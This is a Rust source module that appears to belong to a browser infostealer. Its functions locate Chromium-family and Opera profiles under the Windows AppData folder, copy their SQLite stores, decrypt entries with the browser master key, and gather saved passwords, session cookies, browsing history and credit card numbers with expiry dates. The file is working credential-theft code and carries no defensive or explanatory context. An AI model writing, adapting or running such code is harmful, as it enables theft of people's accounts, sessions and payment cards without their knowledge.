use crate::crypto;
use crate::constants;
use rusqlite::{Connection, OpenFlags};
use std::{
    env,
    fs::{self},
    path::{Path, PathBuf},
};
use uuid::Uuid;

fn get_user_data_dir(chromunium_dir: &PathBuf) -> PathBuf {
    let mut user_data_dir = chromunium_dir.to_owned();

    if !chromunium_dir.to_string_lossy().contains("Opera Software") {
        user_data_dir = user_data_dir.join("User Data");
    }

    user_data_dir
}

fn get_default_path(user_data_dir: &PathBuf) -> PathBuf {
    let mut login_data_path = user_data_dir.to_owned();

    if !user_data_dir.to_string_lossy().contains("Opera Software") {
        login_data_path = login_data_path.join("Default");
    }

    login_data_path
}

pub fn get_passwords() -> Vec<String> {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let mut passwords = Vec::new();

    for chromunium_target in constants::CHROMUNIUM_TARGETS.iter() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            // println!("dir {:?} do not exit\n",chromunium_dir);
            println!("can not find chromunium path\n");
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            // println!("local_state_path do not exit\n");
            continue;
        }

        let master_key = match crypto::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        let default_path = get_default_path(&user_data_dir);
        let login_data_path = default_path.join("Login Data");

        if !login_data_path.exists() {
            // println!("login_data_path do not exit\n");
            continue;
        }

        let temp_env = std::env::temp_dir();

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(login_data_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn
            .prepare("SELECT origin_url, username_value, password_value FROM logins")
            .unwrap();

        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let origin_url: String = row.get(0).unwrap();
            let username: String = row.get(1).unwrap();
            let password = crypto::aes_decrypt(row.get(2).unwrap(), &master_key);

            passwords.push(format!(
                "URL: {}\nUsername: {}\nPassword: {}\n",
                origin_url,
                username,
                std::str::from_utf8(&password).unwrap()
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    passwords
}

pub fn get_cookies() -> Vec<String> {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let mut cookies = Vec::new();

    for chromunium_target in constants::CHROMUNIUM_TARGETS.iter() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        let default_path = get_default_path(&user_data_dir);
        let cookies_path = default_path.join("Network").join("Cookies");

        if !cookies_path.exists() {
            continue;
        }

        let temp_env = std::env::temp_dir();

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(cookies_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn
            .prepare("SELECT host_key, name, encrypted_value FROM cookies")
            .unwrap();

        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let host: String = row.get(0).unwrap();
            let name: String = row.get(1).unwrap();
            let value = crypto::aes_decrypt(row.get(2).unwrap(), &master_key);

            cookies.push(format!(
                "Host: {}\nName: {}\nValue: {}\n",
                host,
                name,
                std::str::from_utf8(&value).unwrap()
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    cookies
}

pub fn get_history() -> Vec<String> {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let mut history = Vec::new();

    for chromunium_target in constants::CHROMUNIUM_TARGETS.iter() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let default_path = get_default_path(&user_data_dir);
        let history_path = default_path.join("History");

        if !history_path.exists() {
            continue;
        }

        let temp_env = std::env::temp_dir();

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(history_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn
            .prepare("SELECT title, url, visit_count FROM urls")
            .unwrap();
        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let title: String = row.get(0).unwrap();
            let url: String = row.get(1).unwrap();
            let visit_count: u32 = row.get(2).unwrap();

            history.push(format!(
                "URL: {}\nTitle: {}\nVisit count: {}\n",
                url, title, visit_count
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    history
}

pub fn get_credit_cards() -> Vec<String> {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let mut credit_cards = Vec::new();

    for chromunium_target in constants::CHROMUNIUM_TARGETS.iter() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        let default_path = get_default_path(&user_data_dir);
        let credit_cards_path = default_path.join("Web Data");

        if !credit_cards_path.exists() {
            continue;
        }

        let temp_env = std::env::temp_dir();

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(credit_cards_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn.prepare("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").unwrap();

        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let name_on_card: String = row.get(0).unwrap();
            let expiration_month: i32 = row.get(1).unwrap();
            let expiration_year: i32 = row.get(2).unwrap();
            let card_number = crypto::aes_decrypt(row.get(3).unwrap(), &master_key);

            let expiration = format!("{}/{}", expiration_month, expiration_year);

            credit_cards.push(format!(
                "Name: {}\nExpiration: {}\nCard number: {}\n",
                name_on_card,
                expiration,
                std::str::from_utf8(&card_number).unwrap()
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    credit_cards
}